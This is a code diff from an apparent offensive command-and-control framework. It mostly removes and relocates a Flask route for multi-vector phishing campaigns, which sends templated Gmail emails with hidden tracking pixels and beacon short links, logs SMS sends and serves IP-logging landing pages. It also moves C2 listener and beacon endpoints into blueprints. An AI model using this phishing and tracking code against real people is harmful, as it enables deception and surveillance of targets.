-        expiry = int(time.time()) + 3600
-
-        conn = sqlite3.connect(DB_PATH)
-        cursor = conn.cursor()
-        cursor.execute("""CREATE TABLE IF NOT EXISTS auth_tokens
-                         (user_id INTEGER, token TEXT, expiry INTEGER)""")
-        cursor.execute(
-            "INSERT INTO auth_tokens (user_id, token, expiry) VALUES (?, ?, ?)", (current_user.id, token, expiry)
-        )
-        conn.commit()
-        conn.close()
-
-        return render_template("phishing/create_multivector_campaign.html", auth_token=token)
-
-    if request.method == "POST":
-        yaml_input = request.form.get("yaml_input")
-        auth_token = request.form.get("auth_token")
-
-        conn = sqlite3.connect(DB_PATH)
-        cursor = conn.cursor()
-        cursor.execute("SELECT expiry FROM auth_tokens WHERE user_id = ? AND token = ?", (current_user.id, auth_token))
-        result = cursor.fetchone()
-        conn.close()
-
-        if not result or result[0] < int(time.time()):
-            flash("Invalid or expired authentication token.", "error")
-            return redirect(url_for("phishing.create_multivector_campaign"))
-
-        if not yaml_input:
-            flash("YAML input is required.", "error")
-            return redirect(url_for("phishing.create_multivector_campaign"))
-
-        try:
-            data = yaml.safe_load(yaml_input)
-            if not data or not data.get("name") or not data.get("vectors"):
-                flash("Campaign name and vectors are required.", "error")
-                return redirect(url_for("phishing.create_multivector_campaign"))
-        except yaml.YAMLError as e:
-            logger.error(f"Invalid YAML input: {e}")
-            flash("Invalid YAML format. Check your syntax and try again.", "error")
-            return redirect(url_for("phishing.create_multivector_campaign"))
-
-        campaign_id = str(uuid.uuid4())
-        campaign = {
-            "id": campaign_id,
-            "name": data["name"],
-            "vectors": data.get("vectors", {}),
-            "created_at": datetime.now().isoformat(),
-        }
-        try:
-            with open(os.path.join(CAMPAIGNS_DIR, f"{campaign_id}.yaml"), "w") as f:
-                yaml.safe_dump(campaign, f)
-            logger.info(f"Created multi-vector campaign: {campaign_id}")
-        except Exception as e:
-            logger.error(f"Error saving campaign {campaign_id}: {e}")
-            flash("Failed to save campaign.", "error")
-            return redirect(url_for("phishing.create_multivector_campaign"))
-
-        conn = sqlite3.connect(DB_PATH)
-        cursor = conn.cursor()
-        short_urls = load_short_urls()
-
-        if "email" in campaign["vectors"]:
-            email_vector = campaign["vectors"]["email"]
-            template_file = os.path.join(TEMPLATES_DIR, f"{email_vector.get('template', '')}.yaml")
-            template = load_yaml_safely(template_file)
-            if not template:
-                flash("Invalid email template.", "error")
-                return redirect(url_for("phishing.create_multivector_campaign"))
-            beacon_url = email_vector.get("beacon_url", "")
-            if not beacon_url:
-                short_url = secrets.token_urlsafe(6)
-                short_urls[short_url] = {
-                    "original_url": f"http://{request.host}/track/{short_url}",
-                    "active": True,
-                    "created_at": datetime.now().isoformat(),
-                }
-                beacon_url = f"http://{request.host}/{short_url}"
-                campaign["vectors"]["email"]["beacon_url"] = beacon_url
-            with yagmail.SMTP(GMAIL_ADDRESS, GMAIL_APP_PASSWORD) as yag:
-                for recipient in email_vector.get("recipients", []):
-                    tracking_url = url_for(
-                        "phishing.track_pixel", campaign_id=campaign_id, email=recipient, _external=True
-                    )
-                    html_body = template["body"].format(
-                        name=recipient.split("@")[0],
-                        beacon_url=beacon_url,
-                        tracking_pixel=f'<img src="{tracking_url}" width="1" height="1" alt="" />',
-                    )
-                    yag.send(to=recipient, subject=template["subject"], contents=html_body)
-                    cursor.execute(
-                        "INSERT INTO multivector_tracking (campaign_id, email, event_type, ip, timestamp) VALUES (?, ?, ?, ?, ?)",
-                        (campaign_id, recipient, "email_sent", request.remote_addr, datetime.now().isoformat()),
-                    )
-
-        if "sms" in campaign["vectors"]:
-            sms_vector = campaign["vectors"]["sms"]
-            beacon_url = sms_vector.get("beacon_url", "")
-            if not beacon_url:
-                short_url = secrets.token_urlsafe(6)
-                short_urls[short_url] = {
-                    "original_url": f"http://{request.host}/track/{short_url}",
-                    "active": True,
-                    "created_at": datetime.now().isoformat(),
-                }
-                beacon_url = f"http://{request.host}/{short_url}"
-                campaign["vectors"]["sms"]["beacon_url"] = beacon_url
-            message = sms_vector.get("message", "")
-            for recipient in sms_vector.get("recipients", []):
-                try:
-                    formatted_message = message.format(beacon_url=beacon_url)
-                    logger.info(f"Sent SMS to {recipient} with message: {formatted_message}")
-                    cursor.execute(
-                        "INSERT INTO multivector_tracking (campaign_id, email, event_type, ip, timestamp) VALUES (?, ?, ?, ?, ?)",
-                        (campaign_id, recipient, "sms_sent", request.remote_addr, datetime.now().isoformat()),
-                    )
-                except Exception as e:
-                    logger.error(f"Error sending SMS to {recipient}: {e}")
-
-        if "landing_page" in campaign["vectors"]:
-            landing_vector = campaign["vectors"]["landing_page"]
-            beacon_url = landing_vector.get("beacon_url", "")
-            if not beacon_url:
-                short_url = secrets.token_urlsafe(6)
-                short_urls[short_url] = {
-                    "original_url": f"http://{request.host}/track/{short_url}",
-                    "active": True,
-                    "created_at": datetime.now().isoformat(),
-                }
-                beacon_url = f"http://{request.host}/{short_url}"
-                campaign["vectors"]["landing_page"]["beacon_url"] = beacon_url
-
-            template_name = landing_vector.get("template", "")
-            if template_name:
-                cursor.execute(
-                    "INSERT INTO multivector_tracking (campaign_id, email, event_type, ip, timestamp) VALUES (?, ?, ?, ?, ?)",
-                    (campaign_id, "unknown", "landing_page_created", request.remote_addr, datetime.now().isoformat()),
-                )
-        save_short_urls(short_urls)
-        conn.commit()
-        conn.close()
-
-        with open(os.path.join(CAMPAIGNS_DIR, f"{campaign_id}.yaml"), "w") as f:
-            yaml.safe_dump(campaign, f)
-
-        return jsonify({"campaign_id": campaign_id, "message": "Multi-vector campaign created successfully"}), 200
-
-
-@phishing_bp.route("/phishing/landing/<campaign_id>/<short_url>")
-def serve_landing_page(campaign_id, short_url):
-    campaign_file = os.path.join(CAMPAIGNS_DIR, f"{campaign_id}.yaml")
-    campaign = load_yaml_safely(campaign_file)
-    if not campaign or "landing_page" not in campaign.get("vectors", {}):
-        abort(404)
-    short_urls = load_short_urls()
-    if short_url not in short_urls or not short_urls[short_url]["active"]:
-        abort(404)
-    template_name = campaign["vectors"]["landing_page"].get("template", "")
-    if not template_name:
-        abort(404)
-    conn = sqlite3.connect(DB_PATH)
-    cursor = conn.cursor()
-    cursor.execute(
-        "INSERT INTO multivector_tracking (campaign_id, email, event_type, ip, timestamp) VALUES (?, ?, ?, ?, ?)",
-        (campaign_id, "unknown", "landing_page_visit", request.remote_addr, datetime.now().isoformat()),
-    )
-    conn.commit()
-    conn.close()
-    return render_template(
-        f"phishing/landing_pages/{template_name}.html", beacon_url=short_urls[short_url]["original_url"]
-    )
 
 
 def _is_local_request():
@@ -9265,96 +7625,18 @@ def api_dashboard():
 
 
 # ── Listener Management API ───────────────────────────────────────────────
-
-
-@app.route("/api/listeners", methods=["GET"])
-@requires_auth
-def api_listeners():
-    """List all configured C2 listeners and their runtime status."""
-    return jsonify({"listeners": listener_manager.status()})
-
-
-@app.route("/api/listeners", methods=["POST"])
-@requires_auth
-def api_listeners_create():
-    """Create a new listener."""
-    data = request.get_json(silent=True) or {}
-    port = data.get("port")
-    if not port or not isinstance(port, int):
-        return jsonify({"status": "error", "message": "port (int) is required"}), 400
-    ssl_flag = data.get("ssl", False)
-    listener_id = data.get("id")
-    listener = listener_manager.add(port=port, ssl=ssl_flag, listener_id=listener_id)
-    if data.get("start", True):
-        listener_manager.start(listener.id)
-    return jsonify({"status": "ok", "listener": listener.to_dict()})
-
-
-@app.route("/api/listeners/<listener_id>/start", methods=["POST"])
-@requires_auth
-def api_listeners_start(listener_id):
-    """Start an existing listener."""
-    ok = listener_manager.start(listener_id)
-    return jsonify({"status": "ok" if ok else "error"})
-
-
-@app.route("/api/listeners/<listener_id>/stop", methods=["POST"])
-@requires_auth
-def api_listeners_stop(listener_id):
-    """Stop a running listener."""
-    ok = listener_manager.stop(listener_id)
-    return jsonify({"status": "ok" if ok else "error"})
-
-
-@app.route("/api/listeners/<listener_id>", methods=["DELETE"])
-@requires_auth
-def api_listeners_delete(listener_id):
-    """Remove a listener configuration."""
-    ok = listener_manager.remove(listener_id)
-    return jsonify({"status": "ok" if ok else "error"})
+# Owned by lazyc2.listeners.blueprint (listeners_bp); registered below.
 
 
 try:
-    from lazyc2.blueprints import (
-        addons_bp,
-        api_bp,
-        auth_bp,
-        beacon_bp,
-        gym_bp,
-        init_beacon_bp,
-        init_loops_bp,
-        loops_bp,
-        operations_bp,
-        redirect_bp,
-    )
-
-    init_beacon_bp(
-        commands=commands,
-        results=results,
-        commands_history=commands_history,
-        connected_clients=connected_clients,
-        encrypt_fn=encrypt_data,
-        decrypt_fn=decrypt_data,
-        config=config,
-        sessions_dir=SESSIONS_DIR,
-        route_malleable=route_malleable,
-    )
+    from lazyc2.blueprints import register_blueprints
 
     def _loops_guard(view, needs_csrf: bool):
         if needs_csrf:
             return requires_auth(csrf_protect(view))
         return requires_auth(view)
 
-    init_loops_bp(limiter, guard=_loops_guard)
-    app.register_blueprint(operations_bp)
-    app.register_blueprint(auth_bp)
-
-    app.register_blueprint(beacon_bp)
-    app.register_blueprint(redirect_bp)
-    app.register_blueprint(api_bp)
-    app.register_blueprint(addons_bp)
-    app.register_blueprint(gym_bp)
-    app.register_blueprint(loops_bp)
+    register_blueprints(app, limiter=limiter, loops_guard=_loops_guard)
 except Exception as _obp_err:
     print(f"[c2] Blueprint not loaded: {_obp_err}")
 
@@ -9407,16 +7689,14 @@ if __name__ == "__main__":
     app.register_blueprint(phishing_bp)
 
     try:
-        sys.path.insert(0, os.path.join(os.path.dirname(__file__), "modules"))
-        from dashboard_bp import dashboard_bp
+        from modules.dashboard_bp import dashboard_bp
 
         app.register_blueprint(dashboard_bp, url_prefix="/dashboard")
     except Exception as _dbp_err:
         print(f"[dashboard] Blueprint not loaded: {_dbp_err}")
 
     try:
-        sys.path.insert(0, os.path.join(os.path.dirname(__file__), "modules"))
-        from collab_bp import collab_bp
+        from modules.collab_bp import collab_bp
 
         app.config["LAZYOWN_CONFIG"] = config
         app.register_blueprint(collab_bp, url_prefix="/collab")
